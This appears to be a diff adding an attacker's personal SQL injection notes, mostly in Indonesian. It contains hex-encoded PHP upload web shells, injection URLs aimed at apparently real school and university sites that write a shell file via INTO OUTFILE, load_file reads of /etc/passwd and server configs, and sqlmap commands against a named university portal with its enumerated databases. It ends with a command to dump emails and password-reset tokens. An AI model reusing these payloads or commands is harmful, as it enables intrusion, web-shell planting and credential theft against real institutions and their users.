@@ -1,0 +1,232 @@
+https://exploit.linuxsec.org/sql-injection-pada-halaman-login/
+
+https://www.linuxsec.org/2014/03/tutorial-basic-sql-injection.html?m=1
+
+https://exploit.linuxsec.org/tutorial-sql-injection-load-file-dan-outfile/
+
+https://exploit.linuxsec.org/sql-injection-pada-halaman-login/
+
+/!00000CoNcAt/
+(0x3c3f706870206563686f20273c7072653e272e7068705f756e616d6528292e226e222e273c62722f3e3c666f726d206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d64617461223e3c696e70757420747970653d2266696c6522206e616d653d225f5f223e3c696e707574206e616d653d225f2220747970653d227375626d6974222076616c75653d2255706c6f6164223e3c2f666f726d3e273b696628245f504f5354297b69662840636f707928245f46494c45535b275f5f275d5b27746d705f6e616d65275d2c20245f46494c45535b275f5f275d5b276e616d65275d29297b6563686f20274f4b273b7d656c73657b6563686f20274552273b7d7d3f3e)
+
+http://36.94.99.202/siparida/restoran_bb_sekolah.php?kdsekolah=34%27+union+select+0x3C3F706870206563686F202755706C6F616465723C62723E273B6563686F20273C62723E273B6563686F20273C666F726D20616374696F6E3D2222206D6574686F643D22706F73742220656E63747970653D226D756C7469706172742F666F726D2D6461746122206E616D653D2275706C6F61646572222069643D2275706C6F61646572223E273B6563686F20273C696E70757420747970653D2266696C6522206E616D653D2266696C65222073697A653D223530223E3C696E707574206E616D653D225F75706C2220747970653D227375626D6974222069643D225F75706C222076616C75653D2255706C6F6164223E3C2F666F726D3E273B69662820245F504F53545B275F75706C275D203D3D202255706C6F6164222029207B69662840636F707928245F46494C45535B2766696C65275D5B27746D705F6E616D65275D2C20245F46494C45535B2766696C65275D5B276E616D65275D2929207B206563686F20273C623E55706C6F6164202121213C2F623E3C62723E3C62723E273B207D656C7365207B206563686F20273C623E55706C6F6164202121213C2F623E3C62723E3C62723E273B207D7D3F3E,2,3,4,5,6,7+INTO+OUTFILE+%27C:/xampp/htdocs/shell.php%27--+-&nmsekolah=SD%20NEGERI%20NO.%20200401%20POKENJIOR%20PADANGSIDEMPUAN
+
+0x746573543132333435
+
+uploder
+0x3c3f706870206563686f20273c7072653e272e7068705f756e616d6528292e226e222e273c62722f3e3c666f726d206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d64617461223e3c696e70757420747970653d2266696c6522206e616d653d225f5f223e3c696e707574206e616d653d225f2220747970653d227375626d6974222076616c75653d2255706c6f6164223e3c2f666f726d3e273b696628245f504f5354297b69662840636f707928245f46494c45535b275f5f275d5b27746d705f6e616d65275d2c20245f46494c45535b275f5f275d5b276e616d65275d29297b6563686f20274f4b273b7d656c73657b6563686f20274552273b7d7d3f3e
+
+tutor sqlmap
+https://youtu.be/WxckHtXCJyo?feature=shared
+
+$post data :
+<input type="hidden" value="00014" name="id_paket" required> ==$0
+<button type="submit" class="btn btn-xs btn-info">Detail</button>
+
+
+untuk melihat fath directory tmp
+@@slave_load_tmpdir
+
+load_file('/opt/lampp/htdocs/empleo/classes/momo3.php')
+fath :
+/opt/lampp/htdocs/sipasada/view/
+
+
+
+$load file menemukan fath
+@@DATADIR
+load_file('/etc/httpd/conf/httpd.conf')
+load_file('/etc/httpd/conf/httpd.conf')
+load_file('/etc/passwd')
+var/www/html/ load_file('/etc/apache2/sites-available/default')
+
+D:/xampp/apache/conf/httpd.conf
+D:/xampp/apache/conf/extra/httpd-xampp.conf
+D:/xampp/apache/conf/extra/httpd-ssl.conf
+
+
+$fath :
+/home/website/public_html/path web
+
+
+$untuk mencari Y/yes bisa upload
+file_priv  +from+mysql.user--+-
++into+outfile+'C:/xampp/htdocs/1000.php'--+-
+
+$dios cek user privileges
+(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)
+
+https://reg.cgi.ac.th/course/deleteCourse_CSCB.php?CourseID_delete=0403606%27%20union%20select%201,2,3,4,5,6--+-
+
+Filename: 
+D:/web_share/web_folder/toko/17_KASIR/index.php
+C:/ inetpub/ wwwroot/ hak cipta/ halaman/ filere/ 
+C:/laragon/www/eregis.snru.ac.th/
+var/www/html/ load_file('/etc/apache2/sites-available/default')
+
+A PHP Error was encountered
+Severity: Warning
+
+Message: mysqli::real_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: YES)
+
+Filename: mysqli/mysqli_driver.php
+
+Line Number: 203
+
+Backtrace:
+
+
+Line: 315
+Function: require_once
+
+A Database Error Occurred
+Unable to connect to your database server using the provided settings.
+
+Filename: D:/web_share/web_folder/toko/17_KASIR/system/database/DB_driver.php
+
+Line Number: 436
+
+https://gist.github.com/zhnlk/f01775e3bda2a0a1b5ac15f5a4feccc5/
+
+dork 
+https://github.com/ShivamRai2003/SQL-Injection-Google-Dork-List/blob/main/SQL-Injection-Dork%20List
+
+
+contoh untuk melihat user
+python3 sqlmap.py -u "https://matriculate.pedagogica.edu.sv/empleo/portal/detalle.php?id=757" 
+--form --current-user --privileges
+
+Cek data base
+python3 sqlmap.py -u "https://matriculate.pedagogica.edu.sv/empleo/portal/detalle.php?id=757" --tables -D phpmyadmin
+
+available databases [20]:
+[*] checklist
+[*] demo
+[*] information_schema
+[*] login
+[*] mysql
+[*] new_ginecoapp
+[*] ojs
+[*] pasantias
+[*] PASANTIAS
+[*] pedagogi_dae
+[*] pedagogi_doctora
+[*] performance_schema
+[*] phpmyadmin
+[*] portal_estudiante
+[*] sisprapro
+[*] sistema_kardex
+[*] sistema_vot_uped
+[*] test
+[*] testsisprapro
+[*] upes_prueba
+
+
+
+Tabel nya udah dapet, sekarang kita coba dumping data didalam tabel nya pake command
+
+--tables -D phpmyadmin -T  
+
+[21 tables]
++------------------------------+
+| chk_asignatura_estados       |
+| chk_asignaturas              |
+| chk_ciclos                   |
+| chk_docentes                 |
+| chk_evaluacion_criterios     |
+| chk_evaluacion_detalles      |
+| chk_evaluacion_observaciones |
+| chk_evaluacion_respuestas    |
+| chk_evaluaciones             |
+| chk_facultades               |
+| chk_link_permiso_usuarios    |
+| chk_permiso_usuarios         |
+| chk_tipo_grupos              |
+| chk_tipo_usuarios            |
+| chk_user_dec_fac             |
+| chk_usuarios                 |
+| failed_jobs                  |
+| grado                        |
+| migrations                   |
+| password_reset_tokens        |
+| personal_access_tokens       |
++------------------------------+
+
+
+
+Database: login
+[40 tables]
++----------------------------------------------+
+| failed_jobs                                  |
+| migrations                                   |
+| password_resets                              |
+| portal_estudiante_ciclos                     |
+| portal_estudiante_docentes                   |
+| portal_estudiante_docentes_evaluadores       |
+| portal_estudiante_docentes_info              |
+| portal_estudiante_escuelas                   |
+| portal_estudiante_evaluacion_carreras        |
+| portal_estudiante_evaluacion_categorias      |
+| portal_estudiante_evaluacion_comentarios     |
+| portal_estudiante_evaluacion_duracion        |
+| portal_estudiante_evaluacion_fecha_activo    |
+| portal_estudiante_evaluacion_planes          |
+| portal_estudiante_evaluacion_planes_materias |
+| portal_estudiante_evaluacion_preguntas       |
+| portal_estudiante_evaluacion_puntos_mejora   |
+| portal_estudiante_evaluacion_realizada       |
+| portal_estudiante_evaluacion_rep_rango       |
+| portal_estudiante_evaluacion_respuestas      |
+| portal_estudiante_evaluacion_tipo            |
+| portal_estudiante_evaluadores                |
+| portal_estudiante_evaluadores_info           |
+| portal_estudiante_eventos                    |
+| portal_estudiante_experiencia_preguntas      |
+| portal_estudiante_experiencia_realizada      |
+| portal_estudiante_experiencia_respuestas     |
+| portal_estudiante_facultades                 |
+| portal_estudiante_grupos                     |
+| portal_estudiante_info_usuarios              |
+| portal_estudiante_log                        |
+| portal_estudiante_materias                   |
+| portal_estudiante_materias_docentes          |
+| portal_estudiante_materias_estudiantes       |
+| portal_estudiante_materias_grupos_ciclos     |
+| portal_estudiante_respuestas_eva_docente     |
+| portal_estudiante_roles                      |
+| portal_estudiante_roles_usuarios             |
+| portal_estudiante_servicios                  |
+| portal_estudiante_usuarios
+
+
+Database: phpmyadmin
+[19 tables]
++------------------------+
+| pma__bookmark          |
+| pma__central_columns   |
+| pma__column_info       |
+| pma__designer_settings |
+| pma__export_templates  |
+| pma__favorite          |
+| pma__history           |
+| pma__navigationhiding  |
+| pma__pdf_pages         |
+| pma__recent            |
+| pma__relation          |
+| pma__savedsearches     |
+| pma__table_coords      |
+| pma__table_info        |
+| pma__table_uiprefs     |
+| pma__tracking          |
+| pma__userconfig        |
+| pma__usergroups        |
+| pma__users             |
++------------------------+
+
+python3 sqlmap.py -u "https://matriculate.pedagogica.edu.sv/empleo/portal/detalle.php?id=757" --dbs
+
+python3 sqlmap.py -u "https://matriculate.pedagogica.edu.sv/empleo/portal/detalle.php?id=757" --tables -D login
+
+python3 sqlmap.py -u "https://matriculate.pedagogica.edu.sv/empleo/portal/detalle.php?id=757" -D login -T password_resets --columns
+
+python3 sqlmap.py -u "https://matriculate.pedagogica.edu.sv/empleo/portal/detalle.php?id=757" -D login -T password_resets -C email,token --dump
